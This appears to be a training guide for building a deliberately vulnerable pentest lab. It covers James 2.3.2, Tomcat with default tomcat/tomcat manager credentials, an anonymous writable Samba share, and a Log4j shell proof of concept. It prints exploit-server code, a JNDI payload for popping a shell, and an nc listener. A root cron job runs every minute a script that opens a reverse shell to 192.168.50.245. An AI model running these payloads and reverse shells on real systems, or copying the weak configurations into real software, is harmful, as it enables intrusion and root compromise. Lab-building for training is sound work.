# Vulnerable server
### You can use this script and the configurations that follow to create vulnerable lab for network pentest training
#### The script will install the following
* James-2.3.2 vulnerable server with smtp
* Misconfigured apache-tomcat
* Misconfigured Samba
* Log4j PoC
* Misconfihured crontab file

```
#!/bin/bash
sudo apt update 
sudo apt install openjdk-8-jdk -y
#Samba
echo "*********Install samba*********"
sudo apt install samba -y
sudo mkdir -p /samba
sudo ufw allow samba
echo "*******samba done**********"
#install docker
echo "***********Install docker***********"
sudo apt update
sudo apt install ca-certificates curl gnupg lsb-release
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
  sudo apt update
  sudo chmod a+r /etc/apt/keyrings/docker.gpg -y
sudo apt update
sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin -y
sudo usermod -aG docker ${USER}
echo "*********docker is done**********"

echo "*********install james server********"
sudo apt install bash-completion  
curl -O https://archive.apache.org/dist/james/server/apache-james-2.3.2.tar.gz
tar -xzf apache-james-2.3.2.tar.gz
sudo cp -r james-2.3.2 /opt
sudo chmod +x /opt/james-2.3.2/bin/*.sh
echo "***********james server done **********"

#Tomcat
echo "********About to install apache tomcat***"
curl -O https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.71/bin/apache-tomcat-9.0.71.tar.gz
tar -xf apache-tomcat-9.0.71.tar.gz
sudo mv apache-tomcat-9.0.71 /opt
echo "apache tomcat is done"

#Postfix smtp
echo "Installing postfix smtp server"
sudo apt update
sudo apt install postfix
sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.bk
echo "smtp done"

#Log4j PoC
echo "*********log4j poc************"
mkdir ~/mylog4j
git clone https://github.com/kozmer/log4j-shell-poc.git
sudo mv log4j-shell-poc ~/mylog4j  
cd ~/mylog4j/log4j-shell-poc
sudo apt install python3-pip
pip install -r requirements.txt
echo "*******log4j poc done*******"
```

# Configure the James Server Phonix.sh script 
```
export JAVA_HOME="/usr/lib/jvm/java-8-openjdk-amd64"
export JAVA_HOME
PATH=$PATH:$JAVA_HOME/bin
export PATH
Or copy the above command to you .profile file run source .profile
Run echo $PATH to ensure that JAVA_HOME is part of the path.

cd /opt/james-2.3.2/bin
open the phonix.sh file and set the JAVA_HOME:

...
JAVA_HOME="/usr/lib/jvm/java-8-openjdk-amd64"
usage()
{
    echo "Usage: $0 {start|stop|run|restart|check}"
    exit 1
}
…
```
### Create Start James server Script with the name startjamesserver.sh
```
#startjamesserver.sh
#!/bin/bash
cd /opt/james-2.3.2/bin
echo "apache james server started"
sudo ./run.sh
```
### Run 

chmod + startjamesserver.sh

./startjamesserver.sh to start the server.

# Apache Tomcat Configuration
Open the tomcat-users.xml in the /opt/apache-tomcat-9.0.68/conf

Modify the manager section of the tomcat-users.xml file as follows:
 
```
<role rolename="manager-gui"/>
<user username="tomcat" password="tomcat" roles="manager-gui"/>
</tomcat-users>

…
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
<role rolename="manager-gui"/>
<user username="tomcat" password="tomcat" roles="manager-gui"/>
</tomcat-users>

```


### Configure apache-tomcat Listening port
Go to / opt/apache-tomcat-9.0.71/conf/server.xml and change the listening port from 8080 t0 8081 to avoid conflict with log4j port. 

Change ### Connector port="8080" to ### Connector port="8081"
```
<!-- A "Connector" represents an endpoint by which requests are received
         and responses are returned. Documentation at :
         Java HTTP Connector: /docs/config/http.html
         Java AJP  Connector: /docs/config/ajp.html
         APR (HTTP/AJP) Connector: /docs/apr.html
         Define a non-SSL/TLS HTTP/1.1 Connector on port 8080
    -->
    <Connector port="8081" protocol="HTTP/1.1"
               connectionTimeout="20000"
               redirectPort="8443" />
    <!-- A "Connector" using the shared thread pool-->
    <!--
    <Connector executor="tomcatThreadPool"
               port="8080" protocol="HTTP/1.1"
               connectionTimeout="20000"
               redirectPort="8443" />
    -->
```
### Start apache with script name startapache.sh
```
#!/bin/bash
cd /opt/tomcat/apache-tomcat-9.0.68/bin
./startup.sh

chmod +x startapache.sh
sudo ./startapache.sh
```

# Log4j PoC

Modify the poc.py file to point to the jAVA_HOME as follows:
```
…
#!/usr/bin/env python3
    try:
        p.write_text(program)
        subprocess.run([os.path.join(CUR_FOLDER, "/usr/lib/jvm/java-8-openjdk-amd64/bin/javac"), str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Exploit java class created success')
def payload(userip: str, webport: int, lport: int) -> None:
    generate_payload(userip, lport)
    print(Fore.GREEN + '[+] Setting up LDAP server\n')
    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    t1.start()
    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()
def check_java() -> bool:
    exit_code = subprocess.call([
        os.path.join(CUR_FOLDER, '/usr/lib/jvm/java-8-openjdk-amd64/bin/java'),
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return exit_code == 0
    
def ldap_server(userip: str, lport: int) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
    url = "http://{}:{}/#Exploit".format(userip, lport)
    subprocess.run([
        os.path.join(CUR_FOLDER, "/usr/lib/jvm/java-8-openjdk-amd64/bin/java"),
        "-cp",
        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])
…
```

Run the payload generator to generate payload script

```
#generatelog4jpayload.sh
#!/bin/bash
echo "site runs at port 8080"
cd ~/mylog4j/log4j-shell-poc
python3 poc.py --userip localhost --webport 8000 --lport 9001
chmod +x generatelog4jpayload.sh
./generatelog4jpayload.sh
```
Where generatelog4jpayload.sh is the name of the script above.

### Start reverse shell listerner

nc -lvnp 9001

### Build the docker image
```
#!/bin/bash
cd ~/mylog4j/log4j-shell-poc
docker build -t log4j-shell-poc .
```
Run 
```
sudo docker build -t log4j-shell-poc .
if you have not restarted you machine after docker installation
```
### Run docker website
```
docker run --network host log4j-shell-poc
```
Once it is running, you can access it on localhost:8080

Copy the payload ${jndi:ldap://localhost:1389/a} and paste it in the username field of the vulnerable site. Click on the Login button to pop a shell.

# Samba config
### Create Users password
```
sudo adduser username
sudo smbpasswd -a username
```
### Configure the Samba users in the smb.conf file as follows:

```
sudo nano /etc/samba/smb.conf

#======================= Global Settings =======================

[global]

#just addedd
#client min protocol = SMB2
#client max protocol = SMB3
## Browsing/Identification ###
# Change this to the workgroup/NT-domain name your Samba server will part of
   workgroup = WORKGROUP
[Anonymous]
# comment = YOUR COMMENTS
 path = /samba/anonymous
 public = yes
 guest only = yes
 browsable = yes
 force create mode = 0666
 force directory mode = 0777
 writable = yes
 guest ok = yes
 read only = no
 force user = nobody
[users]
    path = /samba/users
    browseable = yes
    valid users = @smbgrp
    read only = no
    force create mode = 0660
    force directory mode = 2770
    valid users = @sambashare @sadmin
[josh]
    path = /samba/josh
    browseable = yes
    valid users = @smbgrp
    read only = no
    force create mode = 0660
    force directory mode = 2770
    valid users = josh @sadmin
[James]
    path = /samba/james
    browseable = no
    valid users = @smbgrp
    read only = yes
    force create mode = 0660
    force directory mode = 2770
    valid users = james @sadmin
```
### Restart
sudo systemctl restart smbd

# Crontab configuration
Go to sudo nano /etc/crontab

Edit the cron job file as below:
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*  *   * * *    root    backup.sh
*  *   * * *    root   reverse.sh
*  *   * * *    root    script.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
### backup.sh script

```
#!/bin/bash
#chmod +s /bin/bash
# bash -i   >&  /dev/tcp/192.168.50.245/1234  0  >&1
#nc 192.168.50.234 1234
```
### reverse.sh
```
#!/bin/bash
#bash -i     >&  /dev/tcp/192.168.50.245/1234  0  >&1
#bash -i  >&  /dev/tcp/192.168.50.245/1234  0  >&1 
bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
```
# SSH
Generate ssh key with ssh-keygen

Passphrase PASSPHRASE

Accept the default settings

cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys

# References
* https://github.com/kozmer/log4j-shell-poc
* https://phoenixnap.com/kb/ubuntu-samba
* https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html


